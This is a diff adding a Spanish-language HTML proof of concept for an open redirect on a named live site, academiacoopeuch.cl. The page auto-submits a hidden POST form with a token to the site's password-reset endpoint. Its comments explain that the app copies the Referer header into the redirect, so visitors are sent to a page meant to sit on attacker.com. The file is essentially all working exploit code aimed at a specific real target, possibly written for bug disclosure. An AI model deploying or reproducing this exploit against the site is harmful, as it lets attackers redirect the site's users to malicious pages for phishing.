@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title>Open Redirect PoC (Auto)</title>
+</head>
+<body>
+  <h1>Open Redirect PoC</h1>
+  <p>Esta página enviará un POST a <code>academiacoopeuch.cl</code> y, por el bug,
+     serás redirigido de vuelta a este dominio (<code>attacker.com</code>).</p>
+
+  <!-- IMPORTANTE: este archivo debe estar servido en https://attacker.com/poc.html -->
+  <form id="poc" action="https://academiacoopeuch.cl/password/email" method="POST" target="_top">
+    <!-- Campos mínimos; el endpoint acepta POST y luego siempre redirige usando Referer -->
+    <input type="hidden" name="_token" value="2z6AjcYV70MueSWQBQcClyJ2dfKBr2fAishK7N36">
+    <input type="hidden" name="login_key" value="test@example.com">
+    <input type="hidden" name="restablecer" value="">
+  </form>
+
+  <script>
+    // En navegadores, el header Referer será el de esta página (https://attacker.com/poc.html).
+    // Eso es lo que la app copia a Location => // o https://attacker.com
+    document.getElementById('poc').submit();
+  </script>
+</body>
+</html>
